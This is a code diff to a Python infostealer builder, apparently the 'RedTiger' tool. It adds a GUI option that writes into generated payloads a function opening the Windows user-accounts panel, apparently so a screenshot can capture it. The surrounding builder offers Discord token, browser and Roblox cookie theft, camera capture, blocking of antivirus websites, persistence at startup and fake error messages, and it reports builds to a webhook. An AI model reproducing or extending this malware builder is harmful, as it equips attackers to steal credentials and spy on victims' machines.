@@ -48,6 +48,8 @@ def Startup():
     pass
 def System_Grab():
     pass
+def Open_User_Profile_Settings():
+    pass
 def Screenshot_Grab():
     pass
 def Camera_Capture_Grab():
@@ -1235,6 +1237,19 @@ def Camera_Capture_Grab():
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
+OpenUserProfilSettings = r'''
+def Open_User_Profile_Settings():
+    try:
+        subprocess.Popen(["control", "userpasswords2"])
+        time.sleep(2)
+    except:
+        pass
+'''
+
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
 ScreenshotGrab = r'''
 def Screenshot_Grab():
     try:
@@ -1394,6 +1409,10 @@ try:
 except:
     pass
 try:
+    Open_User_Profile_Settings()
+except:
+    pass
+try:
     Screenshot_Grab()
 except:
     pass
@@ -1546,7 +1565,7 @@ def disinfect():
         script_path = "./Settings/Program/Builder-Disinfect.py"
         if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1) <= 32:
             raise ctypes.WinError()
-        print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully, restart your pc.")
+        print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully.")
     except Exception as e:
         print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Error during disinfection: {white}{e}")
 
@@ -1571,7 +1590,7 @@ style = ttk.Style()
 if sys.platform.startswith("win"):
     root.iconbitmap('Img/RedTiger_icon.ico')
 root.title(f'{name_tool} {version_tool} | Builder Stealer')
-root.geometry("890x440")
+root.geometry("890x490")
 root.resizable(False, False)
 red_color = '#a80505'
 white_color = "#ffffff"
@@ -1611,6 +1630,7 @@ add_browser = "Disable"
 add_roblox = "Disable"
 add_blockwebsite = "Disable"
 add_cameracapture = "Disable"
+add_openuserprofilsettings = "Disable"
 add_screenshot = "Disable"
 add_startup = "Disable"
 add_fake_error = "Disable"
@@ -1626,6 +1646,7 @@ add_roblox_var = tk.StringVar(value="Disable")
 add_blockwebsite_var = tk.StringVar(value="Disable")
 add_cameracapture_var = tk.StringVar(value="Disable")
 add_screenshot_var = tk.StringVar(value="Disable")
+add_openuserprofilsettings_var = tk.StringVar(value="Disable")
 add_startup_var = tk.StringVar(value="Disable")
 add_fake_error_var = tk.StringVar(value="Disable")
 add_restart_var = tk.StringVar(value="Disable")
@@ -1640,6 +1661,7 @@ add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_
 add_blockwebsite_cb = ttk.Checkbutton(root, text="Block AV Website", variable=add_blockwebsite_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+add_openuserprofilsettings_cb = ttk.Checkbutton(root, text="Open UserProfil", variable=add_openuserprofilsettings_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', state="disable")
 add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
@@ -1649,12 +1671,22 @@ add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
 add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
 add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
 add_blockwebsite_cb.grid(row=8, column=0, padx=(220, 20), sticky="w")
-add_cameracapture_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
-add_screenshot_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
+add_cameracapture_cb.grid(row=9, column=0, padx=(220, 20), sticky="w")
+add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
+add_openuserprofilsettings_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
 add_fake_error_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
 add_startup_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
 add_restart_cb.grid(row=8, column=1, padx=(5, 10), sticky="w")
 
+def toggle_open_user_profile_settings_cb_state(*args):
+    if add_screenshot_var.get() == "Enable":
+        add_openuserprofilsettings_cb.config(state="normal")
+        add_openuserprofilsettings_var.set("Enable")
+    else:
+        add_openuserprofilsettings_var.set("Disable")
+        add_openuserprofilsettings_cb.config(state="disabled")
+
+add_screenshot_var.trace("w", toggle_open_user_profile_settings_cb_state)
 
 # <<<<<<<<<< Button Style >>>>>>>>>>
 style.configure('Red.TButton', borderwidth=0, background=background_color, font=('Calibri', 12, "bold"), foreground=background_color)
@@ -1672,7 +1704,7 @@ if sys.platform.startswith("win"):
             name_file_entry.config(fg="white")
 
 name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
-name_file_entry.grid(row=9, column=0, padx=(60, 0), pady=(20, 10))
+name_file_entry.grid(row=10, column=0, padx=(60, 0), pady=(20, 10))
 name_file_entry.insert(0, "File Name")
 
 if sys.platform.startswith("win"):
@@ -1682,7 +1714,7 @@ if sys.platform.startswith("win"):
 # <<<<<<<<<< Select Icon >>>>>>>>>>
 
 icon_button = ttk.Button(root, text="Select Icon", command=choose_icon, style='Red.TButton')
-icon_button.grid(row=9, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
+icon_button.grid(row=10, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
 icon_button.config(compound="right")
 
 if file_type_var.get() == "Python File":
@@ -1706,18 +1738,19 @@ except:
     pass
 
 file_type_menu = ttk.OptionMenu(root, file_type_var, *["File Type", "Python File", "Exe File"], style='Red.TButton')
-file_type_menu.grid(row=9, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
+file_type_menu.grid(row=10, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
 file_type_menu.config(compound="right")
 
 # <<<<<<<<<< Build Button >>>>>>>>>>
 def Build_Settings():
-    global add_system, add_discord, add_browser, add_roblox, add_blockwebsite, add_cameracapture, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, file_type
+    global add_system, add_discord, add_browser, add_roblox, add_blockwebsite, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, file_type
     add_system = add_system_var.get()
     add_discord = add_discord_var.get()
     add_browser = add_browser_var.get()
     add_roblox = add_roblox_var.get()
     add_blockwebsite = add_blockwebsite_var.get()
     add_cameracapture = add_cameracapture_var.get()
+    add_openuserprofilsettings = add_openuserprofilsettings_var.get()
     add_screenshot = add_screenshot_var.get()
     add_startup = add_startup_var.get()
     add_fake_error = add_fake_error_var.get()
@@ -1734,17 +1767,17 @@ def Build_Settings():
         random_number = random.randint(1, 1000)
         name_file = f'BuilderStealer_{random_number}'
 
-        root.quit()
-        root.destroy()
+    root.quit()
+    root.destroy()
 
 style.configure('CustomButton.TButton', borderwidth=0, background=background_color, font=('Calibri', 15, "bold"), foreground=background_color)
 
 build_button = ttk.Button(root, text="Build Stealer", command=Build_Settings, style='CustomButton.TButton', width=15)
-build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
+build_button.grid(row=11, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
 
 # <<<<<<<<<< Disinfinct Button >>>>>>>>>>
 disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
-disinfect_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
+disinfect_button.grid(row=11, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
 
 root.mainloop()
 
@@ -1758,6 +1791,7 @@ print(f"{INFO} Roblox Cookie      :{white}", add_roblox)
 print(f"{INFO} Block AV Website   :{white}", add_blockwebsite)
 print(f"{INFO} Camera Capture     :{white}", add_cameracapture)
 print(f"{INFO} Screenshot         :{white}", add_screenshot)
+print(f"{INFO} Open UserProfil    :{white}", add_openuserprofilsettings)
 print(f"{INFO} Launch at Startup  :{white}", add_startup)
 print(f"{INFO} Fake Error         :{white}", add_fake_error)
 print(f"{INFO} Restart Every 5min :{white}", add_restart)
@@ -1840,6 +1874,9 @@ with open(file_text, 'w', encoding='utf-8') as file:
 
     if add_cameracapture in ['Enable']:
         file.write(CameraCaptureGrab)
+
+    if add_openuserprofilsettings in ['Enable']:
+        file.write(OpenUserProfilSettings)
 
     if add_screenshot in ['Enable']:
         file.write(ScreenshotGrab)
@@ -1939,6 +1976,7 @@ fields = [
     {"name": f"Block AV Website:", "value": f"""```{add_blockwebsite}```""", "inline": True},
     {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
     {"name": f"Screenshot:", "value": f"""```{add_screenshot}```""", "inline": True},
+    {"name": f"Open UserProfil:", "value": f"""```{add_openuserprofilsettings}```""", "inline": True},
     {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
     {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
     {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
